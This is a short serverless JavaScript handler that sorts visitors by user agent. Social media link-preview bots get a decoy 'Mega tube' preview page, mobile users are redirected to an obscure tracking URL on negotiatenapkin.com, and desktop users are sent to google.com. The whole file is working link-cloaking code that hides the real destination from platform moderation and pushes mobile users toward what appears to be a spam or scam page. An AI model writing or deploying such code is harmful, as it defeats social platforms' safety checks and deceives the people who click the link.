export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="Mega tube">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://scontent.fkhi4-2.fna.fbcdn.net/v/t39.30808-6/814380428_122103882165476058_4614033111968018706_n.jpg?stp=dst-jpg_tt6&cstp=mx1200x630&ctp=s960x960&_nc_cat=100&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=127cfc&_nc_eui2=AeGDnIRceOTtBYZD49OiVodjodvKbIUUh1mh28pshRSHWSd8n7LutnY2DJAOOHa0t24wwg14HWtPpkh6S1LuU1_b&_nc_ohc=YximJr03MyEQ7kNvwHJLkIi&_nc_oc=Ado5UOjwOJqi3Wn__Ys0d-knDgYAbtiLlpGm4VXIULx3P_AuuqUF-ZkFm-EK_6EV8q8&_nc_zt=23&_nc_ht=scontent.fkhi4-2.fna&_nc_gid=e2a8OriGy8_629BboeU-gg&_nc_ss=7b2a8&oh=00_AQIMRH5gIGrDpixA9gUTGjXE3ITtBzijB1LiySbRvZstOQ&oe=6AB28A71">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://negotiatenapkin.com/xdmz8up55?key=a020f416f71ece8e252f939903b79a97", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
